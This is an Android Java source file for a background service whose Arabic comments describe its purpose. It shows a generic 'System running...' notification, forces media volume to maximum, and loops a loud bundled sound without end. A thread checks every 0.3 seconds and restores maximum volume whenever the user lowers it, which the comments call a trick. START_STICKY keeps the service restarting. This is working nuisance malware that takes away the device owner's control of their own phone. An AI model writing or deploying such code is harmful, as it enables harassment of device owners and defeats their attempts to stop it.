package com.example.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;

public class BgService extends Service {
    private MediaPlayer mediaPlayer;
    private AudioManager audioManager;

    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        
        // الإشعار
        startForeground(1, b.setContentTitle("A_Art").setContentText("System running...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        // 1. تشغيل الصوت
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        
        // رفع الصوت لأقصى درجة
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

        mediaPlayer = MediaPlayer.create(this, R.raw.loud);
        mediaPlayer.setLooping(true); // لوب لا نهائي
        mediaPlayer.setVolume(1.0f, 1.0f); // 100% صوت
        mediaPlayer.start();

        // 2. الحيلة: منع خفض الصوت
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(300); // يراقب كل 0.3 ثانية
                    int currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
                    int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                    
                    // لو المستخدم وطى الصوت، رجعه لأقصى درجة فوراً
                    if (currentVolume < maxVolume) {
                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
